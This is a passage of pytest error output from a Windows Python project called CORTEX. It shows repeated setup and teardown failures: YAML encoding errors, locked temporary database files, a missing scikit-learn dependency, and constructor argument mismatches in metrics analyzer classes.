>       available fixtures: cache, capfd, capfdbinary, caplog, capsys, capsysbinary, capteesys, class_mocker, cov, db_connection, doctest_namespace, mock_agent, mock_tier1_api, mock_tier2_kg, mock_tier3_context, mock_tier_apis, mocker, module_mocker, monkeypatch, no_cover, package_mocker, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_agent_request, sample_agent_response, sample_files, session_mocker, subtests, temp_brain, temp_db, temp_dir, temp_workspace, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory
>       use 'pytest --fixtures [testpath]' for help on them.

D:\PROJECTS\CORTEX\tests\test_risk_mitigation.py:406
_____ ERROR at setup of TestYAMLConversion.test_slash_commands_structure ______
tests\test_yaml_conversion.py:41: in slash_commands_guide
    return yaml.safe_load(f)
           ^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:135: in determine_encoding
    self.update(1)
.venv\Lib\site-packages\yaml\reader.py:153: in update
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
_______ ERROR at setup of TestYAMLConversion.test_no_duplicate_commands _______
tests\test_yaml_conversion.py:41: in slash_commands_guide
    return yaml.safe_load(f)
           ^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:135: in determine_encoding
    self.update(1)
.venv\Lib\site-packages\yaml\reader.py:153: in update
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
_ ERROR at setup of TestYAMLConversion.test_aliases_reference_valid_commands __
tests\test_yaml_conversion.py:41: in slash_commands_guide
    return yaml.safe_load(f)
           ^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:135: in determine_encoding
    self.update(1)
.venv\Lib\site-packages\yaml\reader.py:153: in update
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
__ ERROR at setup of TestYAMLConversion.test_commands_have_operation_mapping __
tests\test_yaml_conversion.py:41: in slash_commands_guide
    return yaml.safe_load(f)
           ^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:135: in determine_encoding
    self.update(1)
.venv\Lib\site-packages\yaml\reader.py:153: in update
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
_____ ERROR at teardown of TestExtractEntities.test_extract_file_entities _____
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmppdpzlstw.db'
____ ERROR at teardown of TestExtractEntities.test_extract_class_entities _____
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmphulydajn.db'
____ ERROR at teardown of TestExtractEntities.test_extract_method_entities ____
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpg6pmfxlg.db'
_ ERROR at teardown of TestExtractEntities.test_extract_multiple_entity_types _
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpeseaca90.db'
_ ERROR at teardown of TestGetConversationEntities.test_get_entities_after_extraction _
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmp6eppgz7x.db'
_ ERROR at teardown of TestGetConversationEntities.test_get_entities_empty_conversation _
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmphzucchsd.db'
_ ERROR at teardown of TestGetEntityStatistics.test_get_statistics_includes_access_count _
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpok7rvae3.db'
_ ERROR at teardown of TestGetEntityStatistics.test_get_statistics_empty_database _
tests\tier1\entities\test_entity_extractor.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmp582yyt91.db'
_ ERROR at teardown of TestEnforceFifoLimit.test_never_evicts_active_conversation _
tests\tier1\fifo\test_queue_manager.py:19: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpo_k8403w.db'
________ ERROR at teardown of TestAddMessages.test_add_single_message _________
tests\tier1\messages\test_message_store.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpa3wiwkfj.db'
_______ ERROR at teardown of TestAddMessages.test_add_multiple_messages _______
tests\tier1\messages\test_message_store.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpqpfm6lrx.db'
_ ERROR at teardown of TestAddMessages.test_add_messages_to_different_conversations _
tests\tier1\messages\test_message_store.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmp83ttug44.db'
___ ERROR at teardown of TestGetMessages.test_get_messages_preserves_order ____
tests\tier1\messages\test_message_store.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmptd5avx8h.db'
__ ERROR at teardown of TestGetMessages.test_get_messages_empty_conversation __
tests\tier1\messages\test_message_store.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpruw00x9h.db'
_ ERROR at teardown of TestGetMessages.test_get_messages_includes_all_fields __
tests\tier1\messages\test_message_store.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpxczeu6n2.db'
__ ERROR at teardown of TestDeleteMessages.test_delete_removes_all_messages ___
tests\tier1\messages\test_message_store.py:18: in temp_db
    db_path.unlink()
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\pathlib\_local.py:746: in unlink
    os.unlink(self)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpdb41p1on.db'
___ ERROR at setup of TestMLContextOptimizer.test_optimizer_initialization ____
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ ERROR at setup of TestMLContextOptimizer.test_optimize_conversation_context_basic _
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ ERROR at setup of TestMLContextOptimizer.test_optimize_with_few_conversations _
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
__ ERROR at setup of TestMLContextOptimizer.test_optimize_with_empty_intent ___
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ ERROR at setup of TestMLContextOptimizer.test_optimize_with_empty_conversations _
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_______ ERROR at setup of TestMLContextOptimizer.test_relevance_scoring _______
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_________ ERROR at setup of TestMLContextOptimizer.test_recency_boost _________
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
________ ERROR at setup of TestMLContextOptimizer.test_token_counting _________
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
___ ERROR at setup of TestMLContextOptimizer.test_quality_score_calculation ___
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_______ ERROR at setup of TestMLContextOptimizer.test_optimization_time _______
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ ERROR at setup of TestMLContextOptimizer.test_optimize_pattern_context_basic _
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ ERROR at setup of TestMLContextOptimizer.test_optimize_patterns_below_limit _
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ ERROR at setup of TestMLContextOptimizer.test_optimize_patterns_without_query _
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
___ ERROR at setup of TestMLContextOptimizer.test_pattern_relevance_scoring ___
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
______ ERROR at setup of TestMLContextOptimizer.test_statistics_tracking ______
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
____ ERROR at setup of TestMLContextOptimizer.test_error_handling_fallback ____
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
___ ERROR at setup of TestMLContextOptimizer.test_none_conversation_content ___
tests\tier1\test_ml_context_optimizer.py:17: in optimizer
    return MLContextOptimizer(target_reduction=0.6, min_quality=0.9)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ ERROR at teardown of TestDatabaseHealthCheck.test_health_check_detects_corrupted_database _
tests\tier2\knowledge_graph\test_database.py:26: in temp_db_path
    shutil.rmtree(temp_dir)
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\shutil.py:790: in rmtree
    return _rmtree_unsafe(path, onexc)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\shutil.py:629: in _rmtree_unsafe
    onexc(os.unlink, fullname, err)
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\shutil.py:625: in _rmtree_unsafe
    os.unlink(fullname)
E   PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmptvktshsl\\test_kg_database.db'
____ ERROR at setup of TestInsightGenerator.test_generator_initialization _____
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestInsightGenerator.test_generate_velocity_insights_no_data _
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestInsightGenerator.test_generate_velocity_insights_with_data _
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestInsightGenerator.test_generate_hotspot_insights_no_data _
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestInsightGenerator.test_generate_hotspot_insights_with_data _
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
______ ERROR at setup of TestInsightGenerator.test_generate_all_insights ______
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
___ ERROR at setup of TestInsightGenerator.test_insight_severity_assignment ___
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_____ ERROR at setup of TestInsightGenerator.test_insight_recommendations _____
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_____ ERROR at setup of TestInsightGenerator.test_empty_insights_handling _____
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_____ ERROR at setup of TestInsightGenerator.test_insight_data_structure ______
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_____ ERROR at setup of TestInsightGenerator.test_multiple_insight_types ______
tests\tier3\analysis\test_insight_generator.py:51: in file_analyzer
    analyzer = FileMetricsAnalyzer(repo_path, context_store)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
___ ERROR at setup of TestFileMetricsAnalyzer.test_analyzer_initialization ____
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
____ ERROR at setup of TestFileMetricsAnalyzer.test_analyze_hotspots_basic ____
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
__ ERROR at setup of TestFileMetricsAnalyzer.test_save_and_retrieve_hotspots __
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
______ ERROR at setup of TestFileMetricsAnalyzer.test_get_unstable_files ______
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_____ ERROR at setup of TestFileMetricsAnalyzer.test_churn_rate_filtering _____
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
___ ERROR at setup of TestFileMetricsAnalyzer.test_stability_classification ___
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_____ ERROR at setup of TestFileMetricsAnalyzer.test_force_analysis_flag ______
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
_____ ERROR at setup of TestFileMetricsAnalyzer.test_date_range_filtering _____
tests\tier3\metrics\test_file_metrics.py:63: in file_analyzer
    return FileMetricsAnalyzer(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: FileMetricsAnalyzer.__init__() takes 2 positional arguments but 3 were given
___ ERROR at setup of TestGitMetricsCollector.test_collector_initialization ___
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestGitMetricsCollector.test_collect_metrics_empty_period _
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
__ ERROR at setup of TestGitMetricsCollector.test_save_and_retrieve_metrics ___
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
__ ERROR at setup of TestGitMetricsCollector.test_get_metrics_date_filtering __
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
__ ERROR at setup of TestGitMetricsCollector.test_duplicate_metric_handling ___
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
____ ERROR at setup of TestGitMetricsCollector.test_force_collection_flag _____
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
_ ERROR at setup of TestGitMetricsCollector.test_aggregation_across_contributors _
tests\tier3\metrics\test_git_metrics.py:61: in git_collector
    return GitMetricsCollector(temp_repo, context_store)
